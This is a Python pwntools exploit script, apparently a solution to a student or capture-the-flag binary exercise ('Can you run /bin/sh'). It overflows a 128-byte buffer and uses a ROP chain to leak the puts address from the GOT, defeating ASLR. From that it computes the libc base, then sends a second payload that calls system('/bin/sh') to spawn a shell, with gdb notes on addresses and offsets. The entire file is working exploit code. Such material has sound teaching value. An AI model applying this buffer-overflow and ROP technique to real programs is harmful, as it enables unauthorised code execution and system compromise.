#!/usr/bin/env python3

from pwn import *
import binascii

DEBUG = True


system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b"
backup_instruction_pointer = system_call

rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]

double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
scanf_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd8"[::-1]

copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]


payload1 = (
    buffer
    + backup_base_pointer  # for padding.
    + rop_pop_rdi_ret
    + puts_got
    + rop_puts  # works with aslr.
    + main_line0
)

f = open("payload", "wb")
f.write(payload1)
f.close()

p = process("./bin")

if DEBUG:
    raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")

r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print(r)
p.sendline(payload1)

leak = p.recvn(7) # receive address of __GI__IO_puts plus line-feed.
leak = leak[::-1] # reverse byte order for printing.
leak = leak[1:] # slice off line-feed (0xa).

# e.g. leak: b'7ffff7e4be10
# x/i 0x7ffff7e4be10
# 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14

print('puts leak: ', binascii.b2a_hex(leak))

# gdb gef> info proc map
# 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so


libc_start_noaslr = 0x7ffff7dd6000
leak = int.from_bytes(leak, byteorder='big', signed=False)
offset = leak - libc_start_noaslr

# noaslr:
# leak:  b'7ffff7e4be10'
# offset to libc: 482832 0x75e10

# with aslr:
# leak - 0x75e10 -> libc start

print('offset:', offset, hex(offset))
libc_start = hex(leak - 0x75e10)

print('libc start:', libc_start)
print('compare with gdb> info proc map')

r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print(r)

payload2 = (
    buffer
    + backup_base_pointer
    + rop_pop_rdi_ret
    + bin_sh_string # aslr.
    + system_call # aslr.
    + exit_call # aslr.
)

p.sendline(payload2)

if DEBUG:
    p.interactive()
